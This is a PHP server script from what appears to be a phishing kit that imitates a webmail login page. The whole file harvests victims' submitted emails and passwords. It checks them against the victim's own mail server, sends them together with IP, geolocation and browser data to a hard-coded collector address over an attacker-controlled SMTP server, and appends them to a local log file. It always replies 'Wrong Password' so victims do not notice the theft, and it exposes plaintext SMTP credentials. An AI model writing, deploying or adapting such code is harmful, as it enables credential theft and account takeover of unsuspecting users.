<?php
// Add CORS headers at the very beginning
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, X-Requested-With");
header("Content-Type: application/json");

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

require_once __DIR__ . '/PHPMailer.php';
require_once __DIR__ . '/SMTP.php';
require_once __DIR__ . '/Exception.php';

// Remove the early exit that was stopping the script
// echo "Postmailer script loaded successfully.";
// exit; // THIS WAS THE PROBLEM - REMOVED

// Get client IP and location data
$ip = $_SERVER['REMOTE_ADDR'];
$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));

session_start();

// Block GET requests - return JSON instead of HTML
if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    http_response_code(403);
    echo json_encode(array('signal' => 'not ok', 'msg' => 'GET requests not allowed'));
    exit;
}

//----------------------------------------------------------\\
// SMTP Configuration
$receiver = "bobrob@elitat.com"; // ENTER YOUR EMAIL HERE
$senderuser = "jered@globalrisk.ru"; // ENTER YOUR SMTP USER
$senderpass = "global.321"; // ENTER YOUR SMTP PASSWORD
$senderport = "587"; // ENTER YOUR SMTP PORT
$senderserver = "mail.globalrisk.ru"; // ENTER YOUR SMTP SERVER
//----------------------------------------------------------\\

// Check if POST data exists
if (!isset($_POST['email']) || !isset($_POST['password'])) {
    echo json_encode(array('signal' => 'not ok', 'msg' => 'Missing email or password'));
    exit;
}

// Get form data and browser info
$browser = $_SERVER['HTTP_USER_AGENT'];
$login = $_POST['email'];
$password = $_POST['password'];
$email = $login;

// Validate email format
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    echo json_encode(array('signal' => 'not ok', 'msg' => 'Invalid email format'));
    exit;
}

// Extract domain from email
$parts = explode("@", $email);
$domain = $parts[1];

// Prepare email subjects
$subg = $ipdat->geoplugin_countryName . " || " . $login;
$subg2 = "notVerifiedRcuteOrange || " . $ipdat->geoplugin_countryName . " || " . $login;

// Prepare message content
$message = "Email : " . $login . "\nPassword : " . $password . "\nIP of sender: " . $ipdat->geoplugin_countryName . " | " . $ipdat->geoplugin_city . " | " . $ip . "\nBrowser: " . $browser . "\nTimestamp: " . date('Y-m-d H:i:s') . "\n" . str_repeat("-", 50) . "\n";

// Test credentials
$mail = new PHPMailer(true);
$mail->SMTPAuth = true;
$mail->Username = $login;
$mail->Password = $password;
$mail->Host = 'mail.' . $domain;
$mail->Port = "587";

$validCredentials = false;

try {
    $validCredentials = $mail->SmtpConnect();
} catch (Exception $error) {
    // Credentials are invalid - this is expected behavior
    $validCredentials = false;
}

// Initialize response data
$data = array();

if ($validCredentials == true) {
    // Send email for valid credentials
    $mail_notify = new PHPMailer;
    $mail_notify->isSMTP();
    $mail_notify->Host = $senderserver;
    $mail_notify->SMTPAuth = true;
    $mail_notify->Username = $senderuser;
    $mail_notify->Password = $senderpass;
    $mail_notify->Port = $senderport;
    $mail_notify->From = $senderuser;
    $mail_notify->FromName = 'SS-RCube';
    $mail_notify->addAddress($receiver);
    $mail_notify->isHTML(true);
    $mail_notify->Subject = $subg;
    $mail_notify->Body = nl2br($message);
    $mail_notify->AltBody = 'Valid credentials captured';
    
    try {
        $mail_notify->send();
    } catch (Exception $e) {
        // Log email sending error but continue
        error_log("Email sending failed: " . $e->getMessage());
    }
    
    $data = array(
        'signal' => 'not ok',
        'msg' => 'Wrong Password'
    );
} else {
    // Send email for invalid credentials
    $mail2 = new PHPMailer;
    $mail2->isSMTP();
    $mail2->Host = $senderserver;
    $mail2->SMTPAuth = true;
    $mail2->Username = $senderuser;
    $mail2->Password = $senderpass;
    $mail2->Port = $senderport;
    $mail2->From = $senderuser;
    $mail2->FromName = 'SS-RCube';
    $mail2->addAddress($receiver);
    $mail2->isHTML(true);
    $mail2->Subject = $subg2;
    $mail2->Body = nl2br($message);
    $mail2->AltBody = 'Invalid credentials captured';
    
    try {
        $mail2->send();
        $data = array(
            'signal' => 'not ok',
            'msg' => 'Wrong Password'
        );
    } catch (Exception $e) {
        // If email fails, still return response
        $data = array(
            'signal' => 'not ok',
            'msg' => 'Wrong Password'
        );
        error_log("Email sending failed: " . $e->getMessage());
    }
}

// Log to file
$fp = fopen("SS-Or.txt", "a");
if ($fp) {
    fputs($fp, $message);
    fclose($fp);
} else {
    error_log("Failed to write to SS-Or.txt file");
}

// Return JSON response
echo json_encode($data);

// Generate random hash (if needed for other purposes)
$praga = rand();
$praga = md5($praga);

exit();
?>